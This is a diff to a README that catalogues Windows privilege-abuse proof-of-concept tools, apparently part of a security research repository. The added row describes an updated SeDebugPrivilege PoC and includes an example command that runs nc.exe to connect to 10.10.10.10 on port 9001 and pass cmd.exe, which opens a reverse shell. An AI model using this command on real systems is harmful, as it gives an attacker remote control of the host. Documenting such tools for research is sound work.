@@ -656,6 +656,7 @@ Currently, released PoCs for a part of them.
 | [SeCreatePagefilePrivilegePoC](./PrivilegedOperations/SeCreatePagefilePrivilegePoC) | This PoC tries to set pagefile option to specific values by `SeCreatePagefilePrivilege`. |
 | [SeCreateTokenPrivilegePoC](./PrivilegedOperations/SeCreateTokenPrivilegePoC) | This PoC tries to create a elevated token by `SeCreateTokenPrivilege`. |
 | [SeDebugPrivilegePoC](./PrivilegedOperations/SeDebugPrivilegePoC) | This PoC tries to open a handle to winlogon.exe by `SeDebugPrivilege`. |
+| [SeDebugPrivilegePoC-V2.exe](./PrivilegedOperations/SeDebugPrivilegePoC-V2.exe) | This PoC updated version of SeDebugPrivilegePoC enabling the inclusion of command arguments to get reverse shell   `.\SeDebugPrivilegePoC.exe "C:\Users\username\Documents\nc.exe 10.10.10.10 9001 -e C:\Windows\system32\cmd.exe"` |
 | [SeRestorePrivilegePoC](./PrivilegedOperations/SeRestorePrivilegePoC) | This PoC tries to write test file in `C:\Windows\System32\` by `SeRestorePrivilege`. |
 | [SeSecurityPrivilegePoC](./PrivilegedOperations/SeSecurityPrivilegePoC) | This PoC tries to read the latest security event by `SeSecurityPrivilege`. |
 | [SeShutdownPrivilegePoC](./PrivilegedOperations/SeShutdownPrivilegePoC) | This PoC tries to cause BSOD by `SeShutdownPrivilege`. |
